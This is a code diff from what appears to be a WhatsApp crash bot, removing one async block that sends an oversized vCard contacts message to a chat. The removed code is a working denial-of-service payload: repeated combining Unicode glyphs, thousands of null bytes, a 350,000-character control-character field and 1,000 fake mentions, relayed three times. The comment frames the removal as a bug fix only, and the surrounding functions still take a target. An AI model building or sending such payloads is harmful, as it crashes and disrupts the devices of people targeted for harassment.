@@ -524,35 +524,7 @@ async function InvobXopown(sock, target) {
   }
 }
 
-( async () => {
-let kenthu = "𐏓ᬊ‌‌🧠‌⃟𝐃𝚺𝐕𝚹𝐑𝐒𝐢𝐗𝐂𝛀𝐑𝚺 ‣ (⁠´⁠°‌‌‌‌‌‌‌‌⁠ω⁠°‌‌‌‌‌‌‌‌⁠｀⁠) #TrashdexCorp ༘ 𝗟𝗲𝗴𝗲𝗻𝗱‣⃟‌🦠"
-let pregnant = "ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿".repeat(30) // angka dan isi pada string ini jangan diubah
-let freesex = `\nEMAIL;TYPE=HOME,INTERNET:EMAIL@MEMEK.COM\nADR;TYPE=HOME:;;${kenthu}${pregnant};;;;`.repeat(30)
-let yntkts = `\nEMAIL;TYPE=HOME,INTERNET:EMAIL@MEMEK.COM\nADR;TYPE=HOME:;;${kenthu}${"\u0000".repeat(3500)};;;;`.repeat(110)
- for (let i = 0; i < 3; i++) {
-let res = await generateWAMessageFromContent(m.chat, {"contactsArrayMessage": {"displayName": kenthu, "contacts": [{"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:${kenthu}${pregnant};;;\nFN:${kenthu}${pregnant}\nORG:${kenthu}${pregnant}\nTITLE:${kenthu}${pregnant}\nTEL;TYPE=HOME,VOICE;waid=6285333831716:+62 853-3383-1716\nTEL;TYPE=CELL;waid=6285669246025:+62 856-6924-6025${freesex}${yntkts}\nLABEL;TYPE=HOME:${kenthu}${pregnant}\nEND:VCARD`}], "contextInfo": {"forwardingScore": 1, "isForwarded": true}}}, {quoted:{
-key: {
-remoteJid: 'p',
-fromMe: false,
-participant: '0@s.whatsapp.net'
-},
-message: {
-"interactiveResponseMessage": {
-"body": {
-"text": "Sent",
-"format": "DEFAULT"
-},
-"nativeFlowResponseMessage": {
-"name": "galaxy_message",
-"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
-"version": 3
-}
-}
-}
-}, contextInfo:{ mentionedJid: [ "6285215587438@s.whatsapp.net", ...Array.from({ length: 1000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ] }})
-await devorsix.relayMessage(m.chat, res.message, {})
-}
-})()
+// [FIXED] Problematic async function using undefined 'm' removed
 
 async function invob(sock, targetNumber) {
     let message = {
